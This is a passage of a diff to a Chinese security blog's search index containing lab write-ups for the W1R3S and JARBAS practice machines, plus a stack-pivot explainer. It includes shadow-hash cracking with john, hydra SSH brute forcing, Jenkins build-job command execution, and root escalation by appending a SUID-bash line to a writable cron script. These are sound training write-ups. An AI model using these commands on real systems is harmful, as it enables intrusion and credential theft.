class="hljs-number">17567</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">sshd</span>:*:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">ftp</span>:*:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">mysql</span>:!:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br></code></pre></td></tr></table></figure>
+<h2 id="john破解shadow">John破解shadow</h2>
+<p>拿到了shadow文件之后，尝试获取密码的明文，这里我们可以使用john工具</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">echo &#x27;w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::&#x27; &gt; shadow.txt<br>john shadow.txt<br></code></pre></td></tr></table></figure>
+<p>获得了w1r3s用户的密码为：computer</p>
+<h2 id="sudoers配置">Sudoers配置</h2>
+<p>使用w1r3s的用户名密码ssh登录靶机，成功拿到了shell</p>
 <p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0042/image-20231225220554667.png"
-alt="image-20231225220554667" /></p>
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0037/image-20231022172735428.png"
+alt="image-20231022172735428" /></p>
+<p>id命令查看当前w1r3s用户的权限，发现存在sudo权限</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)<br></code></pre></td></tr></table></figure>
+<h2 id="ssh暴力破解补充">SSH暴力破解（补充）</h2>
+<p>使用hydra</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">hydra -L users.list -P /usr/share/wordlists/rockyou.txt ssh://192.168.80.146 -t 4<br></code></pre></td></tr></table></figure>
+<p>也可以使用msf</p>
+<h2 id="总结">总结</h2>
+<p>1、Nmap扫描技巧</p>
+<p>2、ftp基本使用</p>
+<p>3、John破解shadow</p>
+<p>4、sudo提权</p>
 ]]></content>
       <categories>
-        <category>二进制安全</category>
-        <category>栈溢出</category>
+        <category>攻防实战</category>
+        <category>靶场笔记</category>
       </categories>
       <tags>
-        <tag>二进制</tag>
-        <tag>栈溢出</tag>
+        <tag>pentest</tag>
+        <tag>nmap</tag>
+        <tag>ftp</tag>
       </tags>
   </entry>
   <entry>
@@ -2997,6 +2851,152 @@ x64</p>
       <tags>
         <tag>二进制</tag>
         <tag>glibc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶场笔记-JARBAS</title>
+    <url>/2023/10/22/blog0038-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0-JARBAS/</url>
+    <content><![CDATA[<p>本篇涉及Jenkins任意命令执行，Crontab提权</p>
+<span id="more"></span>
+<h2 id="主机扫描">主机扫描</h2>
+<p>找到目标主机192.168.80.147</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nmap -sn 192.168.80.0/24<br>Starting Nmap 7.91 ( https://nmap.org ) at 2023-10-22 06:41 EDT<br>Nmap scan report for 192.168.80.2<br>Host is up (0.00057s latency).<br>Nmap scan report for 192.168.80.128<br>Host is up (0.00086s latency).<br>Nmap scan report for 192.168.80.147<br>Host is up (0.0022s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 3.12 seconds<br></code></pre></td></tr></table></figure>
+<h2 id="端口扫描">端口扫描</h2>
+<h3 id="tcp扫描">TCP扫描</h3>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo nmap -sT --min-rate 10000 -p- 192.168.80.147 -oA nmapscan/ports<br>Starting Nmap 7.91 ( https://nmap.org ) at 2023-10-22 06:42 EDT<br>Nmap scan report for 192.168.80.147<br>Host is up (0.00025s latency).<br>Not shown: 65531 closed ports<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3306/tcp open  mysql<br>8080/tcp open  http-proxy<br>MAC Address: 00:0C:29:62:89:29 (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 2.40 seconds<br></code></pre></td></tr></table></figure>
+<p>获取更详细的版本信息</p>
+<ol type="1">
+<li>Web端是PHP5.6</li>
+<li>MariaDB存在未授权</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Starting Nmap 7.91 ( https://nmap.org ) at 2023-10-22 06:45 EDT<br>Nmap scan report for 192.168.80.147<br>Host is up (0.00028s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)<br>|   256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)<br>|_  256 57:72:08:54:b7:56:ff:c3:e6:16:6f:97:cf:ae:7f:76 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16<br>|_http-title: Jarbas - O Seu Mordomo Virtual!<br>3306/tcp open  mysql   MariaDB (unauthorized)<br>8080/tcp open  http    Jetty 9.4.z-SNAPSHOT<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-server-header: Jetty(9.4.z-SNAPSHOT)<br>|_http-title: Site doesn&#x27;t have a title (text/html;charset=utf-8).<br>MAC Address: 00:0C:29:62:89:29 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds<br><br></code></pre></td></tr></table></figure>
+<h3 id="udp扫描">UDP扫描</h3>
+<p>扫描最热门的20个端口，没什么收获</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sU --top-ports <span class="hljs-number">20</span> <span class="hljs-number">192.168.80.147</span> -oA nmapscan/udp<br></code></pre></td></tr></table></figure>
+<h3 id="漏洞扫描">漏洞扫描</h3>
+<p>使用漏洞脚本扫描，也没什么收获</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo nmap --script=vuln -p22,80,3306,8080 192.168.80.147 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure>
+<h2 id="mysql">MySQL</h2>
+<p>虽然提示存在未授权漏洞，但是本身设置拒绝了远程连接，因此尝试失败。</p>
+<h2 id="web服务">Web服务</h2>
+<p>访问80端口Web服务，是一个国外的网站。8080端口运行的是jekins服务。</p>
+<h3 id="目录扫描">目录扫描</h3>
+<p>查看前端发现这里不存在什么代码服务，基本都是定位到webarchive的服务，感觉是查不到什么东西。</p>
+<p>再次使用dirsearch发现存在一个access.html，存放加密的信息。</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tiago</span>:<span class="hljs-number">5978</span>a<span class="hljs-number">63</span>b<span class="hljs-number">4654</span>c<span class="hljs-number">73</span>c<span class="hljs-number">60</span>fa<span class="hljs-number">24</span>f<span class="hljs-number">836386</span>d<span class="hljs-number">87</span><br><span class="hljs-attribute">trindade</span>:f<span class="hljs-number">463</span>f<span class="hljs-number">63616</span>cb<span class="hljs-number">3</span>f<span class="hljs-number">1</span>e<span class="hljs-number">81</span>ce<span class="hljs-number">46</span>b<span class="hljs-number">39</span>f<span class="hljs-number">882</span>fd<span class="hljs-number">5</span><br><span class="hljs-attribute">eder</span>:<span class="hljs-number">9</span>b<span class="hljs-number">38</span>e<span class="hljs-number">2</span>b<span class="hljs-number">1</span>e<span class="hljs-number">8</span>b<span class="hljs-number">12</span>f<span class="hljs-number">426</span>b<span class="hljs-number">0</span>d<span class="hljs-number">208</span>a<span class="hljs-number">7</span>ab<span class="hljs-number">6</span>cb<span class="hljs-number">98</span><br></code></pre></td></tr></table></figure>
+<p>于是尝试md5 reverse</p>
+<figure class="highlight avrasm"><table><tr><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">tiago:</span>italia99<br><span class="hljs-symbol">trindade:</span>marianna<br><span class="hljs-symbol">eder:</span>vipsu<br></code></pre></td></tr></table></figure>
+<h3 id="jenkins攻击">Jenkins攻击</h3>
+<p>将刚刚爆破出来的账号在Jenkin上测试发现，发现eder/vipsu能够顺利进入Jenkins后台。</p>
+<p>尝试Jenkins的两种RCE方式</p>
+<h4 id="脚本命令行rce">脚本命令行RCE</h4>
+<p>Jenkins 右侧系统管理 -&gt; 脚本命令行</p>
+<p>如下图，但是此种模式无法反弹shell</p>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022210700227.png"
+alt="image-20231022210700227" /></p>
+<h4 id="构建任务rce">构建任务RCE</h4>
+<p>选择新建任务</p>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022211658093.png"
+alt="image-20231022211658093" /></p>
+<p>在构建这里选择<code>Execute shell</code>，在下方框中输入你需要执行的命令。</p>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022211844571.png"
+alt="image-20231022211844571" /></p>
+<p>输入完成之后，点击立即构建。</p>
+<p>构建结束可以在下方构建记录的地方看到相应的信息。</p>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022212345470.png" /></p>
+<p>在构建记录的控制台完成相应的命令执行操作，可以看到构建了一个临时的shell脚本，然后执行相应的命令。</p>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022212853661.png"
+alt="image-20231022212853661" /></p>
+<h4 id="反弹shell">反弹shell</h4>
+<p>利用刚刚第二种创建shell脚本的方式，能够顺利反弹shell</p>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022213700589.png"
+alt="image-20231022213700589" /></p>
+<p>顺利拿到了shell</p>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022213731270.png"
+alt="image-20231022213731270" /></p>
+<h2 id="crontab提权">Crontab提权</h2>
+<p>扫描具备suid的可执行文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">find / -perm -u=s -type f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+<p>发现一个敏感服务，定时任务crontab</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">/usr/bin/chfn<br>/usr/bin/chsh<br>/usr/bin/chage<br>/usr/bin/gpasswd<br>/usr/bin/newgrp<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/umount<br>/usr/bin/sudo<br>/usr/bin/pkexec<br>/usr/bin/crontab<br>/usr/bin/passwd<br>/usr/sbin/pam_timestamp_check<br>/usr/sbin/unix_chkpwd<br>/usr/sbin/usernetctl<br>/usr/sbin/userhelper<br>/usr/lib/polkit-1/polkit-agent-helper-1<br>/usr/lib64/dbus-1/dbus-daemon-launch-helper<br></code></pre></td></tr></table></figure>
+<p>查看crontab任务，发现一个root权限的任务</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /etc/crontab<br></code></pre></td></tr></table></figure>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022215734691.png"
+alt="image-20231022215734691" /></p>
+<p>查看该脚本的权限，发现是777权限，则我们只需要编辑该脚本就能够以root身份执行命令。</p>
+<p>向该文件追加一行内容，使得</p>
+<figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;chmod u+s /bin/bash&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>script/CleaningScript.sh<br></code></pre></td></tr></table></figure>
+<p>获得root权限之后，执行如下命令，获取root权限</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">bash -p<br></code></pre></td></tr></table></figure>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022220716669.png"
+alt="image-20231022220716669" /></p>
+<h2 id="总结">总结</h2>
+<ol type="1">
+<li>Jenkins后台的两种RCE方式</li>
+<li>Crontab提权</li>
+</ol>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022220948981.png"
+alt="image-20231022220948981" /></p>
+]]></content>
+      <categories>
+        <category>攻防实战</category>
+        <category>靶场笔记</category>
+      </categories>
+      <tags>
+        <tag>pentest</tag>
+        <tag>nmap</tag>
+        <tag>ftp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>栈迁移原理图示</title>
+    <url>/2023/12/25/blog0042-%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86%E5%9B%BE%E7%A4%BA/</url>
+    <content><![CDATA[<p>在花式栈溢出当中，当栈溢出的长度受到限制，不足以我们布栈（x86）或者写入gadgets（x64），这时候我们就可以考虑栈迁移。</p>
+<span id="more"></span>
+<p>栈迁移可以利用的一个重要条件，就是你能够获取到迁移后的地址。</p>
+<p>无论你是泄露了栈地址还是跳转到bss段，前提是你确定这个地址，这样你才能够跳转到这个地址去完成函数调用或者gadgets的利用。</p>
+<p>具体的利用并不是这篇文章的重点，这篇文章重点在于通过图示说明栈迁移是如何实现的。</p>
+<p>首先，我们可以知道</p>
+<ol type="1">
+<li>esp -&gt; 栈顶地址，ebp -&gt; 栈帧基地址 -&gt;
+上一个栈帧的基地址</li>
+<li>leave指令等价mov esp, ebp; pop ebp;</li>
+<li>ret指令等价pop eip</li>
+</ol>
+<p>这是一个常规的栈</p>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0042/image-20231225215029022.png"
+alt="image-20231225215029022" /></p>
+<p>执行leave之后变成如下的样子</p>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0042/image-20231225215150355.png"
+alt="image-20231225215150355" /></p>
+<p>这里可以看到，我们可以使用栈溢出修改ebp的值，从而使栈帧的基地址改变。</p>
+<p>但是这样esp的值没有改变，那么进入新函数的时候重新构造栈帧，就会导致你的覆写无效（这个逻辑很显然，在我们刚学re2text的时候，你把ebp随便覆写成什么东西都不会影响system的执行）。</p>
+<p>如何修改esp呢，这里我们就重新用到了leave;ret的gadgets</p>
+<p>通过leave指令，使得我们的esp被赋值为修改后的ebp，这样我们的即便构造新栈帧，也能够实现了迁移。</p>
+<p>假设此时我们将ebp覆写至bss段，栈迁移的变化如下。</p>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0042/image-20231225220554667.png"
+alt="image-20231225220554667" /></p>
+]]></content>
+      <categories>
+        <category>二进制安全</category>
+        <category>栈溢出</category>
+      </categories>
+      <tags>
+        <tag>二进制</tag>
+        <tag>栈溢出</tag>
       </tags>
   </entry>
   <entry>
